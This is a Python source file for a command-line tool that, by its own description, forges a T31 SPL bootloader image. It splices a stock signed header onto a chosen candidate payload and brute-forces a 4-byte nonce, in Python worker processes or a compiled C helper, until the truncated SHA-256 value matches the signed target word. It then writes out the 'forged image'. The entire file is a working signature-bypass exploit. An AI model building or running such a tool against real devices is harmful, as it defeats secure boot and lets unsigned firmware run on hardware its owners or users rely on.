#!/usr/bin/env python3

from __future__ import annotations

import argparse
import hashlib
import multiprocessing as mp
import os
from pathlib import Path
from queue import Empty
import subprocess

from t31_spl_utils import (
    DEFAULT_HASH_END_FIELD_OFFSET,
    DEFAULT_KEY_OFFSET,
    DEFAULT_PAYLOAD_OFFSET,
    DEFAULT_SIG_OFFSET,
    merge_reference_header,
    parse_int,
    patch_nonce,
    select_verification_result,
    verify_image,
)

NATIVE_HELPER_SOURCE = Path(__file__).with_name("t31_nonce_search_fast.c")
NATIVE_HELPER_BINARY = Path(__file__).with_name(".t31_nonce_search_fast")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Forge a T31 SPL payload collision using a stock signed header")
    parser.add_argument("--reference", type=Path, required=True)
    parser.add_argument("--candidate", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--nonce-offset", type=parse_int, required=True, help="Offset relative to payload start")
    parser.add_argument("--sig-offset", type=parse_int, default=DEFAULT_SIG_OFFSET)
    parser.add_argument("--key-offset", type=parse_int, default=DEFAULT_KEY_OFFSET)
    parser.add_argument("--payload-offset", type=parse_int, default=DEFAULT_PAYLOAD_OFFSET)
    parser.add_argument("--hash-end", type=parse_int)
    parser.add_argument("--hash-end-field-offset", type=parse_int, default=DEFAULT_HASH_END_FIELD_OFFSET)
    parser.add_argument("--exponent", default="auto", choices=("auto", "3", "65537"))
    parser.add_argument("--workers", type=int, default=0)
    parser.add_argument("--nonce-start", type=parse_int, default=0)
    parser.add_argument("--nonce-limit", type=parse_int, default=0x100000000)
    parser.add_argument("--nonce-byteorder", choices=("little", "big"), default="little")
    parser.add_argument("--native", choices=("auto", "always", "never"), default="auto")
    return parser


def _search_worker(
    payload: bytes,
    target_prefix: bytes,
    nonce_offset: int,
    start: int,
    step: int,
    nonce_limit: int,
    byteorder: str,
    stop_event: mp.synchronize.Event,
    result_queue: mp.Queue,
) -> None:
    trial = bytearray(payload)
    nonce = start
    while nonce < nonce_limit and not stop_event.is_set():
        trial[nonce_offset : nonce_offset + 4] = nonce.to_bytes(4, byteorder, signed=False)
        if hashlib.sha256(trial).digest()[:4] == target_prefix:
            stop_event.set()
            result_queue.put(nonce)
            return
        nonce += step
    result_queue.put(None)


def find_nonce_python(payload: bytes, target_prefix: bytes, nonce_offset: int, args: argparse.Namespace) -> int | None:
    workers = args.workers or (mp.cpu_count() or 1)
    ctx = mp.get_context("fork")
    stop_event = ctx.Event()
    result_queue: mp.Queue = ctx.Queue()
    processes = []

    for worker in range(workers):
        proc = ctx.Process(
            target=_search_worker,
            args=(
                payload,
                target_prefix,
                nonce_offset,
                args.nonce_start + worker,
                workers,
                args.nonce_limit,
                args.nonce_byteorder,
                stop_event,
                result_queue,
            ),
        )
        proc.start()
        processes.append(proc)

    remaining = len(processes)
    found = None
    while remaining:
        try:
            message = result_queue.get(timeout=0.5)
        except Empty:
            if stop_event.is_set() and found is not None:
                break
            continue
        remaining -= 1
        if message is not None:
            found = message
            stop_event.set()
            break

    for proc in processes:
        proc.join(timeout=0.2)
        if proc.is_alive():
            proc.terminate()
            proc.join()

    return found


def build_native_helper() -> Path | None:
    if not NATIVE_HELPER_SOURCE.exists():
        return None
    if NATIVE_HELPER_BINARY.exists() and NATIVE_HELPER_BINARY.stat().st_mtime >= NATIVE_HELPER_SOURCE.stat().st_mtime:
        return NATIVE_HELPER_BINARY

    cmd = [
        os.environ.get("CC", "cc"),
        "-O3",
        "-std=c11",
        "-pthread",
        str(NATIVE_HELPER_SOURCE),
        "-lcrypto",
        "-o",
        str(NATIVE_HELPER_BINARY),
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        return None
    return NATIVE_HELPER_BINARY


def find_nonce_native(
    candidate_path: Path,
    payload_offset: int,
    hash_end: int,
    target_word: int,
    nonce_offset: int,
    args: argparse.Namespace,
) -> int | None:
    helper = build_native_helper()
    if helper is None:
        return None

    cmd = [
        str(helper),
        "--image",
        str(candidate_path),
        "--payload-offset",
        hex(payload_offset),
        "--hash-end",
        hex(hash_end),
        "--nonce-offset",
        hex(nonce_offset),
        "--target-word",
        hex(target_word),
        "--workers",
        str(args.workers or (mp.cpu_count() or 1)),
        "--nonce-start",
        hex(args.nonce_start),
        "--nonce-limit",
        hex(args.nonce_limit),
        "--nonce-byteorder",
        args.nonce_byteorder,
    ]
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, text=True)
    if proc.returncode == 1:
        return None
    if proc.returncode != 0:
        raise SystemExit(f"native helper failed with exit code {proc.returncode}")
    for line in proc.stdout.splitlines():
        if line.startswith("nonce="):
            return int(line.split("=", 1)[1], 0)
    raise SystemExit("native helper did not report a nonce")


def find_nonce(
    payload: bytes,
    target_prefix: bytes,
    nonce_offset: int,
    args: argparse.Namespace,
    *,
    candidate_path: Path,
    payload_offset: int,
    hash_end: int,
    target_word: int,
) -> int | None:
    if args.native != "never":
        nonce = find_nonce_native(candidate_path, payload_offset, hash_end, target_word, nonce_offset, args)
        if nonce is not None:
            return nonce
        if args.native == "always":
            raise SystemExit("native nonce helper unavailable or failed")
        print("native helper unavailable, falling back to Python search")
    return find_nonce_python(payload, target_prefix, nonce_offset, args)


def main() -> int:
    args = build_parser().parse_args()
    reference = args.reference.read_bytes()
    candidate = args.candidate.read_bytes()
    merged = merge_reference_header(reference, candidate, args.payload_offset)
    base_result = select_verification_result(
        reference,
        sig_offset=args.sig_offset,
        key_offset=args.key_offset,
        payload_offset=args.payload_offset,
        hash_end=args.hash_end,
        hash_end_field_offset=args.hash_end_field_offset,
        exponent=args.exponent,
    )

    absolute_nonce_offset = args.payload_offset + args.nonce_offset
    if absolute_nonce_offset + 4 > len(merged):
        raise SystemExit("nonce offset is outside the merged image")

    payload = bytes(merged[args.payload_offset : base_result.hash_end])
    relative_nonce_offset = absolute_nonce_offset - args.payload_offset
    target_prefix = base_result.target_word.to_bytes(4, "big")

    print(f"reference    : {args.reference}")
    print(f"candidate    : {args.candidate}")
    print(f"output       : {args.output}")
    print(f"payload range: 0x{args.payload_offset:x}:0x{base_result.hash_end:x}")
    print(f"target word  : 0x{base_result.target_word:08x}")
    print(f"exponent     : {base_result.exponent}")
    print(f"workers      : {args.workers or (mp.cpu_count() or 1)}")
    print(f"backend      : {args.native}")

    nonce = find_nonce(
        payload,
        target_prefix,
        relative_nonce_offset,
        args,
        candidate_path=args.candidate,
        payload_offset=args.payload_offset,
        hash_end=base_result.hash_end,
        target_word=base_result.target_word,
    )
    if nonce is None:
        print("no collision found in the requested nonce range")
        return 1

    patch_nonce(merged, absolute_nonce_offset, nonce, args.nonce_byteorder)
    verified = verify_image(
        bytes(merged),
        sig_offset=args.sig_offset,
        key_offset=args.key_offset,
        payload_offset=args.payload_offset,
        hash_end=base_result.hash_end,
        hash_end_field_offset=args.hash_end_field_offset,
        exponent=base_result.exponent,
    )
    if not verified.matches:
        print("collision located but final verification failed")
        return 1

    args.output.write_bytes(merged)
    print(f"nonce        : 0x{nonce:08x}")
    print(f"hash word 0  : 0x{verified.hash_word:08x}")
    print("status       : forged image written successfully")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())